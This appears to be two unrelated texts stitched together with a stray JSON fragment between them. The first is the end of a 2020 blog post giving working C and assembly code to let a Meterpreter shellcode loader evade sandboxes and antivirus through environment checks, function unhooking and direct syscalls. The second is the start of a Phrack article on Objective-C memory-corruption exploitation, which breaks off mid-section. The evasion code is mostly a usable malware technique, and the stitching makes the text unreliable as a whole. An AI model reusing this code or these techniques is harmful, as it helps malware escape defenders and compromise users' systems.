0);\nDWORD responseLength;\nWinHttpQueryDataAvailable(hRequest, &responseLength);\nPVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength +\n1);\nWinHttpReadData(hRequest, response, responseLength, &responseLength);\nif (atoi((PSTR)response) != 1337) return false;\nResults (no IP IoCs):\nVT http check2\nThis technique can leverage HTTPS, DNS and other network requests.\nUser interaction\nOnly selected sandboxes can simulate user interaction (like clicking on\na pop-up window). We can issue a message box before executing the\nmalicious code:\nMessageBoxW(NULL, L\"Just click OK\", L\"Hello\", 0);\nmsgbox 1\nActually MessageBox function returns a value based on what button was\nclicked. We can use additional parameters to create more buttons and\ncontinue execution only when specific buttons are clicked. However this\nassumes that a user will actually click the proper button. Also, we may\nnot want a user to see any message when our code is executing.\nint response = MessageBoxW(NULL, L\"Do you want to restart your computer now?\", L\n\"Restart required\", MB_YESNOCANCEL);\nif (response == IDYES) return false;\nmsgbox 2\nThis bypasses some AVs however MS Defender is still able to identify\nthe \u201cMeterpreter trojan\u201d:\nVT msgbox check\nNow let\u2019s require specific ammount of user interaction - we can wait\nuntil the user moves mouse for a specific distance. This may take a\nminute or two for a typical user and even longer for a sandbox\n(hopefully exceeding allocated time frame for the emulation):\nPOINT currentMousePosition;\nPOINT previousMousePosition;\nGetCursorPos(&previousMousePosition);\ndouble mouseDistance = 0;\nwhile (true)\n{\nGetCursorPos(&currentMousePosition);\nmouseDistance += sqrt(\npow(currentMousePosition.x - previousMousePosition.x, 2) +\npow(currentMousePosition.y - previousMousePosition.y, 2)\n);\nSleep(100);\npreviousMousePosition = currentMousePosition;\nif (mouseDistance > 20000) break;\n}\nMalicious intents were detected only by MS Defender (\u201cMeterpreter\u201d). No\nIP IoCs were extracted by VT sandbox:\nVT mouse check\nPrevious user interaction\nSandboxes will probably lack specific indicators of previous user\ninteraction with the system, for example the list of recently accessed\ndocuments may be empty or contain a low number of entries. We can\nbrowse the %APPDATA%\\Microsoft\\Windows\\Recent folder and count items\ninside:\nPWSTR recentFolder = NULL;\nSHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);\nwchar_t recentFolderFiles[MAX_PATH + 1] = L\"\";\nStringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);\nStringCbCatW(recentFolderFiles, MAX_PATH, L\"\\\\*\");\nint numberOfRecentFiles = 0;\nWIN32_FIND_DATAW findFileData;\nHANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);\nif (hFind != INVALID_HANDLE_VALUE)\n{\ndo\n{\nnumberOfRecentFiles++;\n} while (FindNextFileW(hFind, &findFileData));\n}\nif (numberOfRecentFiles >= 2) numberOfRecentFiles-=2; \/\/exclude '.' and '..'\nif (numberOfRecentFiles < 20) return false;\nThis is effective - only 1 AV flagged the binary (as suspicious), no IP\nIoCs extracted:\nVT recent check\nNumber of running processes\nAs sandbox environments have limited resources they may limit the\nnumber of processes running to the minimum. We can assume that a\ntypical user has at least 50 processes running at any moment. Let\u2019s\nenumerate running processes:\nDWORD runningProcessesIDs[1024];\nDWORD runningProcessesCountBytes;\nDWORD runningProcessesCount;\nEnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcesse\nsCountBytes);\nrunningProcessesCount = runningProcessesCountBytes \/ sizeof(DWORD);\nif (runningProcessesCount < 50) return false;\nVirusTotal was unable to extract IP IoCs from this binary:\nVT processes check\nUptime\nSystem uptime may have a low value in a sandbox, especially when the\nvirtual environment is spun up each time a file is analyzed. We use\n64-bit function as regular GetTickCount overflows after 2^32\nmilliseconds (49,7 days):\nULONGLONG uptime = GetTickCount64() \/ 1000;\nif (uptime < 1200) return false; \/\/20 minutes\nAgain, detected by MS Defender and marked as unsafe by Cylance. No IP\nIoCs were extracted by VT sandbox:\nVT uptime check\nDelaying execution\nDelaying execution may evade sandbox analysis by exceeding the time\nlimit for the sample execution. However it\u2019s not as easy as\nSleep(1000000). Sandboxes may fast-forward our \u201cnaps\u201d.\nWhat we can do is to check system uptime before and after Sleeping. We\ncan also use lower-level userland API for sleeping (there is a slightly\nless chance that it is hooked by AV). This requires obtaining function\naddress dynamically - it will be broader used during API calls\nobfuscation described in one of the next articles. Also,\nNtDelayExecution function requires the sleep time parameter in a\ndifferent format than Sleep:\nULONGLONG uptimeBeforeSleep = GetTickCount64();\ntypedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);\nPNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModul\neHandleW(L\"ntdll.dll\"), \"NtDelayExecution\");\nLARGE_INTEGER delay;\ndelay.QuadPart = -10000 * 100000; \/\/ 100 seconds\npNtDelayExecution(FALSE, &delay);\nULONGLONG uptimeAfterSleep = GetTickCount64();\nif ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;\nAnalysis results: Unsafe \u00ae by Cylance, no IP IoCs by VT sandbox:\nVT delay check\nKernel-user shared data\nSome sophisticated sandbox may hook both Sleep function (or even kernel\nmode ZwDelayExecution; however I think that kernel hooks require\nhypervisor-level access nowadays) and GetTickCount64 (or kernel mode\nKeQueryTickCount) . We can use the [6]KUSER_SHARED_DATA structure which\nis shared by the system kernel with user-mode (in read-only mode of\ncourse) and contains information about the \u201ctick count\u201d. This structure\nIt is always located at the same address in the memory (0x7ffe0000).\nActual system uptime (KSYSTEM_TIME structure) is stored at the offset\n0x320. We can just read it from the system\u2019s memory and use to check if\ntickcount-related functions were manipulated by the sandbox:\nSleep(1000000);\nULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;\nLONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;\nULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;\nDWORD time = GetTickCount64();\nDWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_Hi\ngh1Time << 8) +\n((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCo\nuntMultiplier) >> 24);\nif ((time - kernelTime) > 100 && (kernelTime - time) > 100) return false;\nFunction hooking\nAVs\/EDRs\/Sandboxes can hook specific functions (ones often used for\nmalicious purposes, like NtCreateThreadEx for code injection or\nNtReadVirtualMemory for memory reading - especially in case of\nlsass.exe dumping for credentials extraction). When a function is\nhooked, its first instructions are usually overwritten with a jump to\nanother function in an external library, which can make some checks to\ndiscover malicious activity and decide to block further execution.\nLet\u2019s see how to detect and fix function hooks.\nChecking and unhooking functions\nWe could check function assembly bytes and see if there\u2019s any sign of\nhooking (like call instruction or a combination of push and ret\ninstructions). However there\u2019s a better approach: we can compare the\nfunction instructions loaded in the memory with .dll contents on the\ndisk. Let\u2019s see how to do it for NtCreateThreadEx function from\nntdll.dll. We open the library file from disk and map it into memory.\nThen we browse its headers to find relative location of the export\ndirectory. Next we loop through function names stored in AddressOfNames\narray and look for \u201cNtCreateThreadEx\u201d name [7](to find actual function\ncode location we need to browse through the AddressOfNameOrdinals\narray).\n\/\/ manually load the dll\nHANDLE dllFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", GENERIC_READ,\nFILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\nDWORD dllFileSize = GetFileSize(dllFile, NULL);\nHANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_I\nMAGE, 0, 0, NULL);\nHANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0,\n0);\nCloseHandle(dllFile);\n\/\/ analyze the dll\nPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;\nPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + p\nDosHeader->e_lfanew);\nPIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->Op\ntionalHeader);\nPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDll\nFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].V\nirtualAddress);\nPULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirect\nory->AddressOfFunctions);\nPULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-\n>AddressOfNames);\nPUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportD\nirectory->AddressOfNameOrdinals);\n\/\/ find the original function code\nPVOID pNtCreateThreadExOriginal = NULL;\nfor (int i = 0; i < pExportDirectory->NumberOfNames; ++i)\n{\nPCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfName\ns[i]);\nif (!strcmp(pFunctionName, \"NtCreateThreadEx\"))\n{\npNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase +\npAddressOfFunctions[pAddressOfNameOrdinals[i]]);\nbreak;\n}\n}\n\/\/ compare functions\nPVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L\"ntdll.dll\"), \"NtCrea\nteThreadEx\");\nif (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;\nOk, now let\u2019s simulate the case when MessageBoxW is hooked in a way\nthat it immediately returns (with C3 opcode - RET function). We want to\ndetect the hook and patch the function with original assembly code from\nthe dll located on the disk. This is useful when we want to execute\nsome \u201cblacklisted\u201d functions (or a function with specific parameters\nthat are forbiddensa).\n\/\/ function hooking - usually done by AV\/EDR\/Sandbox\n\/\/ this assumes that user32.dll is loaded into the process' address space\nPVOID pMessageBoxW = GetProcAddress(GetModuleHandleW(L\"user32.dll\"), \"MessageBox\nW\");\nDWORD oldProtect;\nVirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);\nchar hook[] = { 0xC3 }; \/\/ ret\nmemcpy(pMessageBoxW, hook, 1);\nVirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);\nMessageBoxW(NULL, L\"Hooked\", L\"Hooked\", 0); \/\/ won't show up\n\/\/ detect and fix the hook\nPVOID pMessageBoxWOriginal = LoadDllFromDiskAndFindFunctionCode(); \/\/ see the pr\nevious code snippet\nPVOID pMessageBoxWHooked = GetProcAddress(GetModuleHandleW(L\"user32.dll\"), \"Mess\nageBoxW\");\nif (memcmp(pMessageBoxWHooked, pMessageBoxWOriginal, 16))\n{\nDWORD oldProtection, tempProtection;\nVirtualProtect(pMessageBoxW, 16, PAGE_EXECUTE_READWRITE, &oldProtection)\n;\nmemcpy(pMessageBoxWHooked, pMessageBoxWOriginal, 16);\nVirtualProtect(pMessageBoxW, 16, oldProtection, &tempProtection);\n}\nMessageBoxW(NULL, L\"Fixed\", L\"Fixed\", 0);\nDirect syscalls\nAnother thing we can do to bypass user-mode API hooks is to invoke\ndirect system calls. Let\u2019s first analyze our simple malware with\nProcess Monitor.\nRecap: the executable injects shellcode and creates new thread to run\nit:\nHANDLE hThread = CreateThread(NULL, 0,\n(PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);\nThread creation event is captured:\nprocmon syscall\nWe see that CreateThread function called from the code results in a\ncall to NtCreateThreadEx. Then execution switches to kernel mode (ring\n0) using a syscall CPU instruction with [8]syscall ID stored in the EAX\nregister.\ndisasm syscall\nIf the NtCreateThreadEx function is hooked, we may not be able to reach\nthe syscall when calling this function, or other higher-level functions\nlike CreateThread etc. We can however bypass the hook by generating the\nsyscall directly from our code - all we need to do is to push all\nfunction parameters to the stack (this can be done in C) and issue the\nsyscall (with assembly).\nFirst we need to define the NtCreateThreadEx in assembly and add .asm\nfile to the project. Also make sure that Microsoft Macro Assembler\nfiles are included in \u201cBuild Customizations\u201d options of the project.\n.code\nNtCreateThreadEx PROC\nmov r10, rcx\nmov eax, 00bdh\nsyscall\nret\nNtCreateThreadEx ENDP\nend\nThen declare external method in the source code:\nEXTERN_C NTSTATUS(NTAPI NtCreateThreadEx)\n(\nOUT PHANDLE hThread,\nIN ACCESS_MASK DesiredAccess,\nIN PVOID ObjectAttributes,\nIN HANDLE ProcessHandle,\nIN PTHREAD_START_ROUTINE lpStartAddress,\nIN PVOID lpParameter,\nIN ULONG Flags,\nIN SIZE_T StackZeroBits,\nIN SIZE_T SizeOfStackCommit,\nIN SIZE_T SizeOfStackReserve,\nOUT PVOID AttributeList\n);\nLast thing to do is to call the function:\nHANDLE hThread;\nHANDLE hProcess = GetCurrentProcess();\nNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (PTHREAD_START_ROUTINE)s\nhellcode_exec, NULL, FALSE, NULL, NULL, NULL, NULL);\nWaitForSingleObject(hThread, INFINITE);\nThat way we have bypassed any hooks on usermode WinAPI thread creation\nfunctions. However we have hardcoded the syscall ID (0xBD) which is\nversion-specific. To support different Windows versions we would need\nto have all syscalls IDs and dynamically check system version. That\u2019s\nwhere [9]SysWhispers tool comes in handy. We can use this great tool to\ngenerate necessary functions and types definitions in C and OS version\nchecks and syscall definitions in assembly.\nSummary\nWe went through popular methods for detecting sandboxes, virtual\nmachines and automated analysis used by malware.\nIn the next article we will take a look at multiple debugger detection\nmethods and talk about how to make debugging of our compiled code\nharder.\nLinks\nBe sure to check these great resources on the topic:\n[10]https:\/\/github.com\/Arvanaghi\/CheckPlease\n[11]https:\/\/github.com\/LordNoteworthy\/al-khaser\n[12]https:\/\/github.com\/a0rtega\/pafish\n[13]https:\/\/github.com\/CheckPointSW\/InviZzzible\n[14]https:\/\/evasions.checkpoint.com\/\n[15]https:\/\/github.com\/hfiref0x\/VBoxHardenedLoader\n[16]https:\/\/outflank.nl\/blog\/2019\/06\/19\/red-team-tactics-combining-dire\nct-system-calls-and-srdi-to-bypass-av-edr\/\n[17]https:\/\/github.com\/jthuraisamy\/SysWhispers\n[18]https:\/\/github.com\/j00ru\/windows-syscalls\n[19]https:\/\/ired.team\/offensive-security\/defense-evasion\/using-syscalls\n-directly-from-visual-studio-to-bypass-avs-edrs\nWritten on April 5, 2020"}
{"text":"[ [1]News ] [ [2]Paper Feed ] [ [3]Issues ] [ [4]Authors ] [\n[5]Archives ] [ [6]Contact ]\n..[ Phrack Magazine ]..\n.:: Modern Objective-C Exploitation Techniques ::.\n__________________________________________________________________\nIssues: [ [7]1 ] [ [8]2 ] [ [9]3 ] [ [10]4 ] [ [11]5 ] [ [12]6 ]\n[ [13]7 ] [ [14]8 ] [ [15]9 ] [ [16]10 ] [ [17]11 ] [ [18]12 ]\n[ [19]13 ] [ [20]14 ] [ [21]15 ] [ [22]16 ] [ [23]17 ] [ [24]18 ]\n[ [25]19 ] [ [26]20 ] [ [27]21 ] [ [28]22 ] [ [29]23 ] [ [30]24 ]\n[ [31]25 ] [ [32]26 ] [ [33]27 ] [ [34]28 ] [ [35]29 ] [ [36]30 ]\n[ [37]31 ] [ [38]32 ] [ [39]33 ] [ [40]34 ] [ [41]35 ] [ [42]36 ]\n[ [43]37 ] [ [44]38 ] [ [45]39 ] [ [46]40 ] [ [47]41 ] [ [48]42 ]\n[ [49]43 ] [ [50]44 ] [ [51]45 ] [ [52]46 ] [ [53]47 ] [ [54]48 ]\n[ [55]49 ] [ [56]50 ] [ [57]51 ] [ [58]52 ] [ [59]53 ] [ [60]54 ]\n[ [61]55 ] [ [62]56 ] [ [63]57 ] [ [64]58 ] [ [65]59 ] [ [66]60 ]\n[ [67]61 ] [ [68]62 ] [ [69]63 ] [ [70]64 ] [ [71]65 ] [ [72]66 ]\n[ [73]67 ] [ [74]68 ] [ [75]69 ] [ [76]70 ]\n[77]Get tar.gz\nCurrent issue : #[78]69 | Release date : 2016-05-06 | Editor : The\nPhrack Staff\n[79]Introduction The Phrack Staff\n[80]Phrack Prophile on Solar Designer The Phrack Staff\n[81]Phrack World News The Phrack Staff\n[82]Linenoise various\n[83]Loopback The Phrack Staff\n[84]The Fall of Hacker Groups Strauss\n[85]Revisiting Mac OS X Kernel Rootkits fG!\n[86]Adobe Shockwave - A case study on memory disclosure aaron portnoy\n[87]Modern Objective-C Exploitation Techniques nemo\n[88]Self-patching Microsoft XML with misalignments and factorials Alisa\nEsage\n[89]Internet Voting: A Requiem for the Dream kerrnel\n[90]Attacking Ruby on Rails Applications joernchen\n[91]Obituary for an Adobe Flash Player bug huku\n[92]OR'LYEH? The Shadow over Firefox argp\n[93]How to hide a hook: A hypervisor for rootkits uty & saman\n[94]International scenes various\nTitle : Modern Objective-C Exploitation Techniques\nAuthor : nemo\n==Phrack Inc.==\nVolume 0x0f, Issue 0x45, Phile #0x09 of 0x10\n|=-----------------------------------------------------------------------=|\n|=-----------=[ Modern Objective-C Exploitation Techniques ]=------------=|\n|=-----------------------------------------------------------------------=|\n|=----------------------------=[ by nemo ]=------------------------------=|\n|=-----------------------=[ nemo@felinemenace.org ]=---------------------=|\n|=-----------------------------------------------------------------------=|\n--[ Introduction\nHello again reader. Over the years the exploitation process has obviously\nshifted in complexity. What once began with the straight forward case of\nturning a single bug into a reliable exploit has now evolved more towards\ncombining vulnerability primitives together in an attempt to bypass each\nof the memory protection hurdles present on a modern day operating system.\nWith this in mind, let's jump once again into the exploitation of\nObjective-C based memory corruption vulnerabilities in a modern time.\nBack in Phrack 0x42 (Phile #0x04) I wrote a paper documenting a way to turn\nthe most common Objective-C memory corruption primitive (an attacker\ncontrolled Objective-C method call) into control of EIP. If you have not\nread this paper, or if it's been a while and you need to refresh, it's\nprobably wise to do so now, as the first half of this paper will only build\non the techniques covered in the original [1]. Contrary to the beliefs of\nIan Beer, the techniques in the original paper are still alive and kicking\nin modern times however some adjustment is needed depending on the context\nof the vulnerability.\n--[ Dangling Objective-C Method Calls\nAs you're aware since you read my paper in [1], Objective-C method calls\nare implemented by passing \"messages\" to the receiver (object) via the\nobjc_msgSend() API call.\nWhen Objective-C objects are allocated, storage for their instance\nvariables is allocated on the native heap with malloc(). The first element\nin this space is a pointer to the class definition in the binary. This is\ntypically referred to as the \"ISA\" pointer. As in: \"an NSString 'IS-A'\nNSObject\".\nWhen dealing with bugs in Objective-C applications it is extremely common\nfor this ISA pointer to be attacker controlled, resulting in an Objective-C\nmethod call to be performed on an attacker controlled memory location.\nThis can occur when dealing with Use-After-Free conditions, heap overflows\ninto objective-c objects, and even format bugs using the %@ format string\ncharacter.\nIn my original paper [1] I wrote about how to utilize this construct to\nperform a successful cache lookup for the selector value, resulting in\ncontrol of EIP. An alternative route to gain EIP control is to make the\nObjective-C runtime think that it's finished looking through the entire\ncache and found no match for the SEL value passed in. In which case the\nruntime will attempt to resolve the method's address via the class\ndefinition (through the controlled ISA pointer) and once again use an EIP\nvalue from memory controlled by us. This method is longer however, and adds\nlittle benefit. But i digress, both of these methods are still completely\nvalid in the most current version of Mac OS X at this time Mavericks,\n(10.10).\nWhile, at the time of the Phrack 0x42 release, this technique was fairly\nuseful by itself, in modern times EIP\/RIP control is only a small victory\nand in no way wins the battle of process control. This is due to the fact\nthat even with direct control of EIP modern NX and ASLR makes it difficult\nto know a reliable absolute location in which we can store a payload and\nreturn to execute it.\nFrom what i've seen, the most commonly used technique to bypass this\ncurrently is to combine an EIP control primitive with an information leak\nof a .text address in order to construct a ROP chain (returning repeatedly\ninto the text segment) which either executes the needed functionality,\nmprotect()'s some shellcode before executing it, or loads an existing\nexecutable or shared library.\nUnder the right conditions, it is possible to skip some of these steps\nand turn a dangling Objective-C method call into both an information leak\nand execution control.\nIn order to use this technique, we must first know the exact binary version\nin use on the target. Thankfully on Mac OS X this is usually pretty easy as\nautomatic updates mean that most people are running the same binary\nversion.\nThe specifics of the technique differ depending on the architecture of the\ntarget system, as well as the location of the particular SEL string which\nis used in the dangling method call construct.\nSince we are already familiar with 32-bit internals, we will begin our\ninvestigation of dangling objc_msgSend() exploitation with the 32-bit\nruntime, before moving on to look at the changes in the new run-time on\n64-bit.\n--[ 32-bit dangling objc_msgSend()\nFirstly, 32-bit processes utilize the old Objective-C runtime, so the\nspecifics of the internals are identical to what is documented in my\noriginal paper. However, depending on the location of the module\ncontaining the selector string, the technique varies slightly.\n----[ 32-bit Shared Region\nThe shared-region is a mapping which is common to all processes on the\nsystem. The file '\/var\/db\/dyld\/dyld_shared_cache_i386' is mapped into this\nspace. This file is generated by the \"update_dyld_shared_cache\" utility\nduring system update, and contains a large selection of libraries which are\ncommonly used on the system. The .paths files in\n\"\/var\/db\/dyld\/shared_region_roots\" dictate which files are contained\nwithin. The order in which each library is added to this file is\nrandomized, therefore the offset into the file for a particular library\ncannot be relied on. Reading the file\n'\/var\/db\/dyld\/dyld_shared_cache_i386.map' shows the order of these files.\nFor 32-bit processes, this file is mapped at the fixed address 0x90000000.\nAt this location there is a structure which described the contents of the\nshared region.\nThis technique, once again, revolves around the ability to control the ISA\npointer, and to point it at a fake class struct in memory. In order to\ndemonstrate how this works, a small sample Objective-C class was created\n(shown below). The complete example of this technique is included at the\nend of this paper in the uuencoded files blob.\n[leakme.m]\n#import \"leakme.h\"\n@implementation leakme\n-(void) log\n{\nprintf(\"lol\\n\");\n}\n@end\nIn main.m, we create an instance of this object, and then use sprintf() to\nwrite out a string representation of the objects address, before converting\nit back with atol(). This is pretty confusing, but it's basically an easy\nway to trick the compiler into giving us a void pointer to the object. Type\ncasting the object pointer directly will not compile with gcc.\nprintf(\"[+] Class @ 0x%lx\\n\",l);\nsprintf(num,\"%li\",l);\nlong *ptr = atol(num);\n...\nprintf(\"[+] Overwriting object\\n\");\n*ptr = &fc; \/\/ isa ptr\nBy overwriting the ISA pointer with the address of an allocation we\ncontrol, we can easily simulate a vulnerable scenario. Obviously in the\nreal world things are not that easy. We need to know the address of an\nallocation which we control. There are a variety of ways this can be\naccomplished. Some examples of these are:\n- Using a leak to read a pointer out of memory.\n- Abusing language weaknesses to infer an address. [2]\n- Abuse the predictable nature of large allocations.\nHowever, these concepts are the topic of many other discussions and not\nrelevant to this particular technique.\nAs a quick refresher, the first thing the Objective-C runtime does when\nattempting to call a method for an object (objc_msgSend()) is to retrieve\nthe location of the method cache for the object. This is done by\noffsetting the ISA pointer by 0x20 and reading the pointer at this\nlocation. To control this cache pointer we use the following structure:\nstruct fakecache {\nchar pad[0x20];\nlong cache_ptr;\n};\nIn the example code we use a separate allocation for the fakecache struct\nand the cache itself. However in a real scenario the address of the cache\nitself would most likely be the same address as the fakecache offset by\n0x24. This would allow us to use a single allocation, and therefore a\nsingle address, reducing the constraints of the exploit. Also, in a real\nworld case we could leak the address of the cache_ptr, then subtract 0x20\nfrom it's address. This would allow us to shave 0x20 bytes off of the\nbuffer we need to control.\nNext, objc_msgSend() traverses the cache looking for a cached method call\nmatching the desired implementation. This is done by iterating through a\nseries of pointers to cache entries. Each entry contains a SEL which\nmatches the cached method SEL in the .text segment of the Objective-C\nbinary. By comparing this SEL value with the SEL value passed to\nobjc_msgSend() the matching entry can be located and used. Rather than\niterating through every pointer to find the appropriate cache entry each\ntime however, a mask is applied to the selector pointer. The masked off\nbits are then shifted and used as an index into the cache table entry\npointer array. Then after this index is used, each entry is inspected.\nThis means that multiple entries can have the same index, however it\ngreatly reduces the search time of the cache. Controlling the mask provides\nus with the mechanism we need to create a leak.\nOk, so going back to the mask. In my original Objective-C paper, we set the\nmask to 0. This forced the runtime to look directly past the mask\nregardless of what value the SEL had. In this case however, we want to\nabuse the mask in order to isolate the \"randomized\" unpredictable bits in\nthe selector pointer value (SEL).\nBelow, we can see a \"real\" SEL value from a 10.10 system, which is located\nin the shared_region.\n(lldb) x\/s $ecx\n0x90f3f86e: \"length\"\nSince we know that the shared region begins at 0x90000000 we know that\nfirst octet will always be 0x9. We also know that the offset into the page\nwhich contains the SEL will always be the same, therefore the last 3\noctets 0x86e will be the same for the binary version we retrieve the SEL\nvalue from. However, we cannot count on the rest of the SEL value being the\nsame on the system we are running our exploit against.\nFor the value 0x90f3f86e we can see the bit pattern looks as follows:\n9   0    f    3    f     8    6   e\n1001 0000 1111 0011 1111 1000 0110 1110 : 0x90f3f86e\nBased on what we just discussed the mask which would retrieve the bits we\ncare about looks as follows:\n0    f    f     f   f     0   0    0\n0000 1111 1111 1111 1111 0000 0000 0000 : 0x0ffff000\nHowever, since objc_msgSend() shifts the SEL 2 to the right prior to\napplying the mask, we must shift our mask to account for this.\nThis leaves us with:\n0    3    f    f    f    c    0    0\n0000 0011 1111 1111 1111 1100 0000 0000 : 0x03fffc00\nAs you remember, objc_msgSend() applies the following calculation to\ngenerate the index into the cache entries:\nindex = (SEL >> 2) & mask\nFilling in the values for this leaves us with an index like:\nindex = (0x90f3f86e >> 2) & 0x03fffc00 == 0x3cfc00\nThis means that for our particular SEL value the runtime will index\n0x3cfc00 * 4 (0xf3f000) bytes forward, and take the bucket pointer from\nthis location. It will then dereference the pointer and check for a SEL\nmatch at that location. By creating a giant cache slide, containing all\npermutations of slide, we can make sure that this location contains the\nright value for slide.\nIn the 32-bit runtime (the old runtime) the cache index is used to retrieve\na pointer to a cache_entry from an array of pointers. (buckets).\nIn our example code (main.m) we set the buckets array up as follows:\nlong *buckets = malloc((CACHESIZE + 1) * sizeof(void *));\nHowever, in a typical exploitation scenario, this array would be part of\nthe single large allocation which we control.\nFor each of the buckets pointers, a cache entry must be allocated. In the\nexample code we can use the following struct for each of these entries:\nstruct cacheentry {\nlong sel;\nlong pad;\nlong eip;\n};\nEach of these structures must be populated with a different SEL and EIP\nvalue depending on its index into the table. For each of the possible\nindex values, we add the (unshifted) randomized bits to the SEL base.\nThis way the appropriate SEL is guaranteed to match after the mask is\napplied and used to index the table.\nFor the EIP value, we can utilize the fact that the string table containing\nthe SEL string is always going to be relative to the .text segment within\nthe same binary. The diagram below shows this more clearly.\n,_______________,<--- Mach-O base address\n|               |\n| mach-o header |\n+---------------+\n|               |<--- SEL in string table, relative to base\n| string table  |    \/\\ Relative offset\n+---------------+    \\\/ from SEL to ROP gadgets\n|               |<--- ROP gadget in .text segment\n| .text segment |\n'---------------'\nFor each possible entry in the table, the EIP value must be set to the\nappropriate address relative to the SEL value used. The quickest way i know\nto calculate these values is to break on the objc_msgSend function and dump\nthe current SEL value. In lldb this is simple a case of using \"reg read\necx\". Next, \"target module list -a $ecx\" provides us with the module base.\nBy subtracting the absolute SEL address from the module base we can get the\nrelative offset within the module. This can be repeated for the gadget\naddress within the same module. Next, when populating the table, we simple\nneed to add these two relative offsets to our potential module base\ncandidate. We increment the module base candidate for each entry in the\ntable.\nBy populating our cache slide in this way we are guaranteed the execution\nof a single ROP gadget within the module that our SEL is in. This can be\nenough for us to succeed. We will look into ways to use this construct\nlater.\nObviously the allocation used for this 32-bit technique is very large. To\ncalculate the size of the cache slide which we need to generate we need to\nlook at the size of the shared region. The shared region always starts at\n0x90000000, but the first module inside the shared region starts at\n0x90008000. The end of the shared region depends on the number of modules\nloaded in the shared region. On the latest version of Mac OS X at this\ntime, the end of the shared region is located at 0x9c391000. The bit\npatterns for these are shown below.\n10010000 00000000 10000000 00000000 :: SR START -- 0x90008000\n10011100 00111001 00010000 00000000 :: SR END   -- 0x9C391000\n00001111 11111111 11110000 00000000 :: MASK UNSHIFTED\nIf we compare this to the unshifted mask, and mask off the bits we care\nabout we get the following values for our potential index values.\n00000000 00000000 00100000 00000000  -- smallest index value - 0x2000\n00000011 00001110 01000100 00000000  -- biggest  index value - 0x30E4400\nSince the buckets array is an array of 4 byte pointer values we can\nmultiple the largest index by 4, giving us 0xc391000. Each cache entry\npointed to by a bucket is 12 bytes in size. This means that the size of the\ncache entry array is 0x24ab3000.\nBy adding these two values together we get the total size of our cache\nslide, 0x30e44000 bytes.\nAllocations of this size can be difficult to make depending on the target\napplication. However, also due to the size, they are predictably placed\nwithin the address space. This buffer can be made from JavaScript for\nexample.\n----[ Uncommon 32-bit Libraries\nLibraries which are not contained within the shared region are mapped in by\nthe linker when an executable is loaded that requires them as a dependency.\nThe location of these modules is always relative to the end of the\nexecutable file and is loaded in the order specified in the LC_LOAD_DYLIB\nheader.\nWhen loading the executable file, the kernel generates a randomized slide\nvalue for ASLR. This value is added to the desired segment load addresses\nin the executable (if it's compiled with PIE) and then the executable is\nre-based to that location.\nuintptr_t requestedLoadAddress = segPreferredLoadAddress(i) +\nslide;\nThe slide value is calculated by the kernel and then passed to the main\nfunction of the dynamic loader. The following algorithm is responsible for\ngenerating the slide value.\naslr_offset = (unsigned int)random();\nmax_slide_pages = vm_map_get_max_aslr_slide_pages(map);\naslr_offset %= max_slide_pages;\naslr_offset <<= vm_map_page_shift(map);\nwhere:\nuint64_t\nvm_map_get_max_aslr_slide_pages(vm_map_t map)\n{\nreturn (1 << (vm_map_is_64bit(map) ? 16 : 8));\n}\nint\nvm_map_page_shift(\nvm_map_t map)\n{\nreturn VM_MAP_PAGE_SHIFT(map);\n}\n#define VM_MAP_PAGE_SHIFT(map) \\\n((map) ? (map)->hdr.page_shift : PAGE_SHIFT)\n#define PAGE_SHIFT I386_PGSHIFT\n#define I386_PGSHIFT 12\nSo for example, a random() value of 0xdeadbeef, would end up as the value\n0xef000. With the following calculation:\nslide = ((0xdeadbeef % (1<<8)) << 12)\nslide = 0xef000\nThe gcc compiler and llvm both (by default) use a load address of 0x1000\nfor the text section of an executable. So for the slide value 0xef000 the\nexecutable file would be based at 0x1000 + 0xef000 = 0xf0000.\nThis means that for the most part, you're dealing with roughly 1 byte of\nunpredictable bits. Depending on the number of libraries loaded which are\noutside of the shared region, this fluctuates, however libraries are always\nloaded in the order stipulated by the executable itself, so this is fairly\npredictable.\nFor our dangling objc_msgSend technique this means that our mask fluctuates\ndepending on the target. In the best case, masking of the single byte in\nthe address can be achieved by using the mask (0x000ff000 >> 2) == 0x3fc00.\n--[ 